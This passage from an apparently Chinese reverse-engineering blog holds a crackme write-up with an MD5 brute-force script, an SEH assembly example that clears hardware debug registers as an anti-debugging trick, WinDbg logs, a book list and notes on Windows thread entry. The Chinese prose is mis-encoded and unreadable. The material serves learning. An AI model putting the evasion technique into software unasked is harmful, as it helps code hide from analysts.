    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token operator">++</span>times<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>åœ¨è¿™é‡Œå‘ç°äº†å®ƒå…¶å®æ˜¯å¯¹String1ä½œä¸ºä¸€ä¸ªè¾“å…¥ï¼ŒåŸå§‹çš„è¾“å…¥åˆ°äº†v20ï¼Œé€šè¿‡MD5åŠ å¯†åä¿å­˜åˆ°String1å’ŒStræ¯”è¾ƒï¼Œè€ŒStrå’ŒString1æ²¡ä»€ä¹ˆå…³ç³»ï¼Œå¹¸å¥½ï¼Œä¸ç„¶F(x)&#x3D;&#x3D;G(Y,X)çš„å‡½æ•°æ›´åŠ å¤æ‚,ä¹Ÿè®¸ä»¥åæˆ‘å¯ä»¥åšä¸€ä¸ªè¿™ç§çš„</p>
<h5 id="MARK-IT"><a href="#MARK-IT" class="headerlink" title="**********************************************************************MARK IT*****************************************************************"></a>******<em><strong><em>*</em>***************************************************************MARK IT*****************************************************************</strong></em></h5><pre class="line-numbers language-none"><code class="language-none">MD5 result
v18
0019F98C  63 38 38 33 37 62 32 33 66 66 38 61 61 61 38 61  c8837b23ff8aaa8a  
0019F99C  32 64 64 65 39 31 35 34 37 33 63 65 30 39 39 31  2dde915473ce0991  


v13
need to make xor
0019F880  57 5E 52 54 49 5F 01 6D 69 46 02 6E 5F 02 6C 57  W^RTI_.miF.n_.lW  
0019F890  5B 54 4C 00 00 00 00 00 53 53 00 00 30 6B 6B 60  [TL.....SS..0kk&#96;  



â€œâ€
C6DCE185903ADADFFF0673FB1FC7AEB6
â€œabcdefgâ€
7AC66C0F148DE9519B8BD264312C4D64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç”±æ­¤æˆ‘å‘ç°äº†MD5åŠ å¯†åçš„å€¼ï¼Œå³Strï¼Œè¿™é‡Œé¢ç”¨win Api åšåˆ°çš„hashåŠ å¯†ä¹Ÿå¾ˆå€¼å¾—å­¦ä¹ ã€‚</p>
<p>ç„¶åå°±æ˜¯æš´åŠ›ç ´è§£MD5ï¼ˆåªæœ‰6ä½ï¼‰ï¼Œè¿™é‡Œæˆ‘ç”¨äº†hashcatï¼Œæ˜¯ä¸€ä¸ªå¥½ä¸œè¥¿ï¼Œæˆ‘å†™çš„è„šæœ¬ï¼Œç›´æ¥æ­‡èœ</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#0r4ngeçš„åƒåœ¾è„šæœ¬</span>
<span class="token comment">#éå¸¸æŠ±æ­‰ï¼Œä¿ºè¿™è„šæœ¬è·‘ä¸å‡ºæ¥2333ï¼Œå°±æŒ‚åœ¨è¿™ä»¥åæ”¹æ”¹ï¼Œå¤šçº¿ç¨‹ç­‰ç­‰ï¼Œå­—å…¸å¤ªé•¿ä¹Ÿå¾ˆéº»çƒ¦å®³ã€‚</span>
<span class="token keyword">import</span> hashlib

<span class="token comment">#dic = "abcdefghijklmnokqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
dic <span class="token operator">=</span> <span class="token string">"abcdefghijklmnokqrstuvwxyz"</span>
dic <span class="token operator">+=</span> <span class="token string">'\0x00'</span>
length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span>

<span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">for</span> f <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        m <span class="token operator">=</span> dic<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>f<span class="token punctuation">]</span>
                        flag<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        flag<span class="token punctuation">.</span>update<span class="token punctuation">(</span>m<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        md5<span class="token operator">=</span>flag<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> md5<span class="token operator">==</span><span class="token string">'c8837b23ff8aaa8a2dde915473ce0991'</span><span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">)</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SUCCESSFUL"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="è¿™é‡Œçš„hashåŠ å¯†å‡½æ•°å…¶å®å¯ä»¥å€Ÿé‰´ä¸€æ³¢çš„ï¼Œæˆ‘å°±markäº†"><a href="#è¿™é‡Œçš„hashåŠ å¯†å‡½æ•°å…¶å®å¯ä»¥å€Ÿé‰´ä¸€æ³¢çš„ï¼Œæˆ‘å°±markäº†" class="headerlink" title="è¿™é‡Œçš„hashåŠ å¯†å‡½æ•°å…¶å®å¯ä»¥å€Ÿé‰´ä¸€æ³¢çš„ï¼Œæˆ‘å°±markäº†"></a>è¿™é‡Œçš„hashåŠ å¯†å‡½æ•°å…¶å®å¯ä»¥å€Ÿé‰´ä¸€æ³¢çš„ï¼Œæˆ‘å°±markäº†</h5><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl sub_4013A0(BYTE *LP____STRING1, DWORD dwDataLen, LPSTR LP____STRING2)
&#123;
  int result; &#x2F;&#x2F; eax
  DWORD i; &#x2F;&#x2F; [esp+4Ch] [ebp-24h]
  CHAR String2; &#x2F;&#x2F; [esp+50h] [ebp-20h]
  BYTE v6[16]; &#x2F;&#x2F; [esp+54h] [ebp-1Ch]
  DWORD pdwDataLen; &#x2F;&#x2F; [esp+64h] [ebp-Ch]
  HCRYPTHASH phHash; &#x2F;&#x2F; [esp+68h] [ebp-8h]
  HCRYPTPROV phProv; &#x2F;&#x2F; [esp+6Ch] [ebp-4h]

  if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )
    return 0;
  if ( CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) )          &#x2F;&#x2F;0x8003 MD5
  &#123;
    if ( CryptHashData(phHash, LP____STRING1, dwDataLen, 0) )
    &#123;
      CryptGetHashParam(phHash, 2u, v6, &amp;pdwDataLen, 0);  &#x2F;&#x2F;2u  HP_HASHVAL
      *LP____STRING2 &#x3D; 0;
      for ( i &#x3D; 0; i &lt; pdwDataLen; ++i )
      &#123;
        wsprintfA(&amp;String2, &quot;%02X&quot;, v6[i]);
        lstrcatA(LP____STRING2, &amp;String2);
      &#125;
      CryptDestroyHash(phHash);
      CryptReleaseContext(phProv, 0);
      result &#x3D; 1;
    &#125;
    else
    &#123;
      CryptDestroyHash(phHash);
      CryptReleaseContext(phProv, 0);
      result &#x3D; 0;
    &#125;
  &#125;
  else
  &#123;
    CryptReleaseContext(phProv, 0);
    result &#x3D; 0;
  &#125;
  return result;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>write_up</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>åè°ƒè¯•ä¹‹å»é™¤ç¡¬ä»¶æ–­ç‚¹</title>
    <url>/2020/11/10/anti_debug_hardware_breakpoint/</url>
    <content><![CDATA[<h2 id="åè°ƒè¯•ä¹‹å»é™¤ç¡¬ä»¶æ–­ç‚¹"><a href="#åè°ƒè¯•ä¹‹å»é™¤ç¡¬ä»¶æ–­ç‚¹" class="headerlink" title="åè°ƒè¯•ä¹‹å»é™¤ç¡¬ä»¶æ–­ç‚¹"></a>åè°ƒè¯•ä¹‹å»é™¤ç¡¬ä»¶æ–­ç‚¹</h2><p>é¦–å…ˆä»‹ç»å‡ ä¸ªX86ä¸‹è°ƒè¯•å¯„å­˜å™¨D0â€¦D7,å·²ç»æ²¡æœ‰D4ï¼ŒD5äº†åœ¨wikiä¸Šè¯´æ˜¯è¢«D6ï¼ŒD7å–ä»£äº†ã€‚</p>
<h3 id="D0â€¦D3"><a href="#D0â€¦D3" class="headerlink" title="D0â€¦D3"></a>D0â€¦D3</h3><hr>
<p>Each of these <a href="https://en.wikipedia.org/wiki/Processor_register">registers</a> contains the <a href="https://en.wikipedia.org/wiki/Virtual_address">linear address</a> associated with one of four breakpoint conditions. Each <a href="https://en.wikipedia.org/wiki/Breakpoint">breakpoint</a> condition is further defined by bits in DR7.</p>
<p>The debug address registers are effective whether or not <a href="https://en.wikipedia.org/wiki/Paging">paging</a> is enabled. The addresses in these registers are linear addresses. If paging is enabled, the linear addresses are translated into <a href="https://en.wikipedia.org/wiki/Physical_address">physical addresses</a> by the processorâ€™s <a href="https://en.wikipedia.org/wiki/Memory_management_unit">paging mechanism</a>. If paging is not enabled, these linear addresses are the same as physical addresses.</p>
<p>Note that when paging is enabled, different tasks may have different linear-to-physical address mappings. When this is the case, an address in a debug address register may be relevant to one task but not to another. For this reason the x86 has both global and local enable bits in DR7. These bits indicate whether a given debug address has a global (all tasks) or local (current task only) relevance.</p>
<hr>
<h3 id="D6"><a href="#D6" class="headerlink" title="D6"></a>D6</h3><hr>
<p>The debug status register permits the debugger to determine which debug conditions have occurred. When the processor detects an enabled debug exception, it sets the low-order bits of this register (0,1,2,3) before entering the <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)#INT_3">debug exception handler</a>.</p>
<p>Note that the bits of DR6 are never cleared by the processor. To avoid any confusion in identifying the next debug exception, the debug handler should move zeros to DR6 immediately before returning.</p>
<hr>
<h3 id="D7"><a href="#D7" class="headerlink" title="D7"></a>D7</h3><hr>
<p>The low-order eight bits of DR7 (0,2,4,6 and 1,3,5,7) selectively enable the four address breakpoint conditions. There are two levels of enabling: the local (0,2,4,6) and global (1,3,5,7) levels. The local enable bits are automatically reset by the processor at every task switch to avoid unwanted breakpoint conditions in the new task. The global enable bits are not reset by a task switch; therefore, they can be used for conditions that are global to all tasks.</p>
<p>Bits 16-17 (DR0), 20-21 (DR1), 24-25 (DR2), 28-29 (DR3), define when breakpoints trigger. Each breakpoint has a two-bit entry that specifies whether they break on execution (00b), data write (01b), data read or write (11b). 10b is defined to mean break on IO read or write but no hardware supports it.[<em><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed">citation needed</a></em>] Bits 18-19 (DR0), 22-23 (DR1), 26-27 (DR2), 30-31 (DR3), define how large an area of memory is watched by breakpoints. Again each breakpoint has a two-bit entry that specifies whether they watch one (00b), two (01b), eight (10b)[<a href="https://en.wikipedia.org/wiki/X86_debug_register#cite_note-1">1]</a> or four (11b) bytes.[<a href="https://en.wikipedia.org/wiki/X86_debug_register#cite_note-2">2]</a></p>
<hr>
<p>D7æœ‰ç‚¹éš¾çœ‹æ‡‚ï¼Œæ‰€ä»¥æˆ‘è‡ªå·±å°è¯•æ€»ç»“ä¸€ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">;******************************************
;coded by Hume,2K+
;ã€ŠåŠ å¯†ä¸è§£å¯†ï¼ˆç¬¬å››ç‰ˆï¼‰ã€‹
;(c)  çœ‹é›ªå­¦é™¢ www.kanxue.com 2000-2018
;******************************************
;ä¾‹å­1.æ¼”ç¤ºåœ¨SEHå›è°ƒå‡½æ•°ä¸­æ¸…ç©ºDrå¯„å­˜å™¨ä»¥è¾¾åˆ°åè°ƒè¯•çš„ç›®çš„
;******************************************
include ..\asminc.h
;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;

	.DATA
Text           db &quot;SEHç¨‹åºæ²¡æœ‰è¿è¡Œ!&quot;,0
TextSEH        db &quot;Hello,SEH!&quot;,0
Caption        db &quot;SEH&quot;,0
	.DATA?
	
.code
_start:
assume fs:nothing
;------------------------------------------------
        push	offset _except_handler
        push	fs:[0]       
        mov	fs:[0],esp  
;---------------------------------------------------
	    mov	esi,0
	    mov	eax,[esi]		
 WouldBeOmit:                                  
   	    invoke  MessageBox,0,addr Text,addr Caption,MB_OK  ; è¿™ä¸€å¥æ°¸è¿œæ— æ³•è¢«æ‰§è¡Œ
;---------------------------------------------------
ExecuteHere:                           
   	    invoke   MessageBox,0,addr TextSEH,addr Caption,MB_OK
;--------------------------------------------------
    	    pop     fs:[0]                      
    	    add     esp,4 
    	    invoke  ExitProcess,NULL        
;-------------------------------------------------
_except_handler proc uses ebx pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD
        mov  	  eax,pContext 
        Assume  eax:ptr CONTEXT
        lea      ebx, ExecuteHere  	
        mov     [eax].regEip,ebx  	
        xor      ebx,ebx
        mov     [eax].iDr0,ebx    	
        mov     [eax].iDr1,ebx
        mov     [eax].iDr2,ebx
        mov     [eax].iDr3,ebx
        mov     [eax].iDr7,341     
        mov     eax,0            	
        ret                     
_except_handler endp
end _start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ba e1 401000<br>ba r2 40107e</p>
<table>
<thead>
<tr>
<th>DR0â€¦DR7</th>
<th>Values</th>
</tr>
</thead>
<tbody><tr>
<td>DR0</td>
<td><em><strong>401000</strong></em></td>
</tr>
<tr>
<td>DR1</td>
<td><em><strong>40107e</strong></em></td>
</tr>
<tr>
<td>DR2</td>
<td>0</td>
</tr>
<tr>
<td>DR3</td>
<td>0</td>
</tr>
<tr>
<td>DR6</td>
<td><em><strong>ffff4ff0</strong></em></td>
</tr>
<tr>
<td>DR7</td>
<td><em><strong>700105</strong></em></td>
</tr>
</tbody></table>
<p>Dr7 |ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼|ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼|</p>
<p>7 0 0 1 0 5h &#x3D; 111 0000 0000 0001 0000 0101b</p>
<p>Dr7 (high)|0 0 0 0 0 0 0 0 <em>0 1</em> <strong>1 1</strong> <em>0 0</em> <strong>0 0</strong>|0 0 0 0 0 0 0 1 0 0 0 0 0 1 0 1|(low)</p>
<p>16-17bits â€”&gt;DR0â€”&gt;00â€”&gt;execution<br>18-19bits â€”&gt;DR0â€”&gt;00â€”&gt;one bytes</p>
<p>20-21bits â€”&gt;DR1â€”&gt;11â€”&gt;data read or write<br>22-23bits â€”&gt;DR1â€”&gt;01â€”&gt;two bytes</p>
<pre class="line-numbers language-none"><code class="language-none">0:000&gt; bp ntdll!KiUserExceptionDispatcher
0:000&gt; gn
Breakpoint 2 hit
eax&#x3D;0019ffcc ebx&#x3D;00364000 ecx&#x3D;00401000 edx&#x3D;00401000 esi&#x3D;00401000 edi&#x3D;00401000
eip&#x3D;772242b0 esp&#x3D;0019fa34 ebp&#x3D;0019ff80 iopl&#x3D;0         nv up ei pl zr na pe nc
cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00000246
ntdll!KiUserExceptionDispatcher:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">0:000&gt; dd esp
0:000&gt; dt _CONTEXT 0019fa8c
ntdll!_CONTEXT
   +0x000 ContextFlags     : 0x1007f
   +0x004 Dr0              : 0x401000
   +0x008 Dr1              : 0x40107e
   +0x00c Dr2              : 0
   +0x010 Dr3              : 0
   +0x014 Dr6              : 0xffff4ff0
   +0x018 Dr7              : 0x700105
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : 0x2b
   +0x090 SegFs            : 0x53
   +0x094 SegEs            : 0x2b
   +0x098 SegDs            : 0x2b
   +0x09c Edi              : 0x401000
   +0x0a0 Esi              : 0x401000
   +0x0a4 Ebx              : 0x364000
   +0x0a8 Edx              : 0x401000
   +0x0ac Ecx              : 0x401000
   +0x0b0 Eax              : 0x19ffcc
   +0x0b4 Ebp              : 0x19ff80
   +0x0b8 Eip              : 0x401013
   +0x0bc SegCs            : 0x23
   +0x0c0 EFlags           : 0x246
   +0x0c4 Esp              : 0x19ff6c
   +0x0c8 SegSs            : 0x2b
   +0x0cc ExtendedRegisters : [512]  &quot;???&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ä»ä¸­å¯è§contextå·²ç»å°è£…äº†dr0â€¦dr7</p>
<pre class="line-numbers language-none"><code class="language-none">0:000&gt; bp 401080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æˆ‘åœ¨handlerçš„è¿”å›çš„åœ°æ–¹ä¸‹äº†ä¸€ä¸ªæ–­ç‚¹ï¼Œçœ‹çœ‹sehæ‰§è¡Œå®Œæ˜¯å¦ä¿®æ”¹äº†è°ƒè¯•å¯„å­˜å™¨</p>
<pre class="line-numbers language-none"><code class="language-none">0:000&gt; g
Breakpoint 3 hit
eax&#x3D;00000000 ebx&#x3D;00000000 ecx&#x3D;00401051 edx&#x3D;77238e90 esi&#x3D;00000000 edi&#x3D;00000000
eip&#x3D;00401080 esp&#x3D;0019f938 ebp&#x3D;0019f958 iopl&#x3D;0         nv up ei pl zr na pe nc
cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00000246
ClearDr+0x1080:
00401080 c21000          ret     10h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">0:000&gt; dt _CONTEXT 0019fa8c
ntdll!_CONTEXT
   +0x000 ContextFlags     : 0x1007f
   +0x004 Dr0              : 0
   +0x008 Dr1              : 0
   +0x00c Dr2              : 0
   +0x010 Dr3              : 0
   +0x014 Dr6              : 0xffff4ff0
   +0x018 Dr7              : 0x155
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : 0x2b
   +0x090 SegFs            : 0x53
   +0x094 SegEs            : 0x2b
   +0x098 SegDs            : 0x2b
   +0x09c Edi              : 0x401000
   +0x0a0 Esi              : 0x401000
   +0x0a4 Ebx              : 0x364000
   +0x0a8 Edx              : 0x401000
   +0x0ac Ecx              : 0x401000
   +0x0b0 Eax              : 0x19ffcc
   +0x0b4 Ebp              : 0x19ff80
   +0x0b8 Eip              : 0x40102d
   +0x0bc SegCs            : 0x23
   +0x0c0 EFlags           : 0x246
   +0x0c4 Esp              : 0x19ff6c
   +0x0c8 SegSs            : 0x2b
   +0x0cc ExtendedRegisters : [512]  &quot;???&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>contextä¸­å°è£…çš„è°ƒè¯•å¯„å­˜å™¨å’Œeipè¢«æ”¹äº†ï¼Œå¦‚æœæ¢å¤æ‰§è¡Œçš„è¯ï¼Œåœ¨ä¸Šçº§å‡½æ•°çš„<strong>å¸®åŠ©</strong>ä¸‹è¿™äº›ä¿®æ”¹å°±ä¼šæˆçœŸï¼Œæ‰€ä»¥è¿™æ“ä½œæŒºéªšçš„ã€‚<del>ä¸è¿‡ä¹Ÿæ˜¾è€Œæ˜“è§æœ‰ç¼ºé™·ã€‚</del></p>
<hr>
<p>ç¬¬å…«ç« çš„å¼‚å¸¸å¤„ç†å‹‰å¼ºçœ‹å®Œï¼Œæœ‰ç‚¹çˆ½ã€‚</p>
<h4 id="mark-VEH-HOOKï¼ŒSEH-HOOKï¼Œå„ç§HOOKã€‚"><a href="#mark-VEH-HOOKï¼ŒSEH-HOOKï¼Œå„ç§HOOKã€‚" class="headerlink" title="mark:VEH HOOKï¼ŒSEH HOOKï¼Œå„ç§HOOKã€‚"></a>mark:VEH HOOKï¼ŒSEH HOOKï¼Œå„ç§HOOKã€‚</h4>]]></content>
      <categories>
        <category>Windbg</category>
        <category>Anti-debug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>anti-debug</tag>
        <tag>windbg</tag>
      </tags>
  </entry>
  <entry>
    <title>marked-book</title>
    <url>/2020/09/28/marked_book/</url>
    <content><![CDATA[<h1 id="windows-system"><a href="#windows-system" class="headerlink" title="windows system"></a>windows system</h1><h2 id="Windowså†…æ ¸åŸç†ä¸å®ç°"><a href="#Windowså†…æ ¸åŸç†ä¸å®ç°" class="headerlink" title="Windowså†…æ ¸åŸç†ä¸å®ç°"></a><a href="https://book.douban.com/subject/4719159//">Windowså†…æ ¸åŸç†ä¸å®ç°</a></h2><h2 id="Windows-å†…æ ¸è®¾è®¡æ€æƒ³"><a href="#Windows-å†…æ ¸è®¾è®¡æ€æƒ³" class="headerlink" title="Windows å†…æ ¸è®¾è®¡æ€æƒ³"></a><a href="https://book.douban.com/subject/26317389/">Windows å†…æ ¸è®¾è®¡æ€æƒ³</a></h2><h1 id="DirectX12"><a href="#DirectX12" class="headerlink" title="DirectX12"></a>DirectX12</h1><h2 id="introduction-to-3d-game-programming-with-directx-12"><a href="#introduction-to-3d-game-programming-with-directx-12" class="headerlink" title="introduction to 3d game programming with directx 12"></a><a href="https://www.amazon.com/Introduction-3D-Game-Programming-DirectX/dp/1942270062">introduction to 3d game programming with directx 12</a></h2>]]></content>
      <categories>
        <category>books</category>
      </categories>
      <tags>
        <tag>mark</tag>
        <tag>book</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿›ç¨‹/çº¿ç¨‹ çš„å®é™…å…¥å£</title>
    <url>/2020/09/28/thread_process_loader/</url>
    <content><![CDATA[<h1 id="è¿›ç¨‹-x2F-çº¿ç¨‹-çš„å®é™…å…¥å£"><a href="#è¿›ç¨‹-x2F-çº¿ç¨‹-çš„å®é™…å…¥å£" class="headerlink" title="è¿›ç¨‹&#x2F;çº¿ç¨‹ çš„å®é™…å…¥å£"></a>è¿›ç¨‹&#x2F;çº¿ç¨‹ çš„å®é™…å…¥å£</h1><p>æˆ‘ä¹‹å‰ä¼šä»¥ä¸ºã€‚è¿›ç¨‹è£…è½½ï¼Œå°±åªæ˜¯æ˜¯åˆ›å»ºä¸€å—å†…å­˜ï¼Œç„¶åæŠŠç¨‹åºæ˜ å°„åˆ°è¿™å—å†…å­˜ï¼Œç„¶ååˆå§‹åŒ–å¯„å­˜å™¨ç­‰ï¼Œå†æŠŠ pc è®¾ç½®åˆ° pe ä¸­çš„ enter point ä¸­ã€‚</p>
<p>å¾ˆæ˜¾ç„¶æˆ‘ä¹‹å‰çŠ¯äº†å½¢è€Œä¸Šå­¦çš„é”™è¯¯ï¼Œè®¤è¯†åº”è¯¥æ˜¯é€’è¿›çš„ï¼ŒæŠŠç»†èŠ‚å¿½ç•¥äº†ç„¶åè‡ªä»¥ä¸ºæ˜¯çš„è¿›è¡Œæ€»ç»“ï¼Œç»“æœå°±æ˜¯å­¦çš„ä¸æ·±å…¥ï¼Œå­¦äº†å’Œæ²¡å­¦ä¼¼çš„ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªå¯ä»¥ä»è½¯ä»¶è®²åˆ°æ“ä½œç³»ç»Ÿï¼Œå†ä»æ“ä½œç³»ç»Ÿè®²åˆ°ç¡¬ä»¶ï¼Œå†å›åˆ°è½¯ä»¶çš„ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œè™½ç„¶ windows æ˜¯é—­æºçš„ã€‚</p>
<p>ä¸ºäº†åˆ†æ windows åˆ›å»ºè¿›ç¨‹çš„è¿‡ç¨‹ï¼Œé¦–å…ˆè¦è®²æ¸…æ¥šä¸€äº›æ•°æ®ç»“æ„å’Œ windows api çš„ä¸€äº›<a href="http://www.thehackerdev.com/posts/2020/09/windows-api-function-naming-convention/">å‘½åæ–¹å¼</a></p>
<pre class="line-numbers language-none"><code class="language-none">windows api name convention

Prefix	Description
Alpc	Advanced Local Procedure Calls
Cc	Common Cache
Cm	Configuration manager
Dbg	Kernel debug support
Dbgk	Debugging Framework for user mode
Em	Errata manager
Etw	Event Tracing for Windows
Ex	Executive support routines
FsRtl	File System Runtime Library
Hv	Hive library
Hvl	Hypervisor library
Io	I&#x2F;O manager
Kd	Kernel debugger
Ke	Kernel
Kse	Kernel Shim Engine
Lsa	Local Security Authority
Mm	Memory manager
Nt	NT system services (accessible from user mode through system calls)
Ob	Object manager
Pf	Prefetcher
Po	Power manager
PoFx	Power framework
Pp	PnP manager
Ppm	Processor power manager
Ps	Process support
Rtl	Run time library
Se	Security Reference Monitor
Sm	Store Manager
Tm	Transaction manager
Ttm	Terminal timeout manager
Vf	Driver Verifier
Vsl	Virtual Secure Mode library
Wdi	Windows Diagnostic Infrastructure
Wfp	Windows FingerPrint
Whea	Windows Hardware Error Architecture
Wmi	Windows Management Instrumentation
Zw	Mirror entry point for system services (beginning with Nt) that sets previous access mode to kernel, which eliminates parameter validation, because Nt system services validate parameters only if previous access mode is user.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä» ntdll!RtlUserThreadStart å¼€å§‹åˆ†æ</p>
<p>ntdll!RtlUserThreadStart ï¼ˆ ntdll version 10.0.22000.527 ï¼‰</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ntdll!RtlUserThreadStart:
4883ec78             sub     rsp, 78h
4c8bc9               mov     r9, rcx   # rcx å€¼ä¸º entrypoint
488b05f2531700       mov     rax, qword ptr [ntdll!Kernel32ThreadInitThunkFunction (00007ffd&#96;b7259c30)]
4885c0               test    rax, rax
741a                 je      ntdll!RtlUserThreadStart+0x2d (00007ffd&#96;b70e485d)
49ba7003d17ea7bfe589 mov     r10, 89E5BFA77ED10370h
4c8bc2               mov     r8, rdx
488bd1               mov     rdx, rcx
33c9                 xor     ecx, ecx
ff15b5e71800         call    qword ptr [ntdll!_guard_xfg_dispatch_icall_fptr (00007ffd&#96;b7273010)]
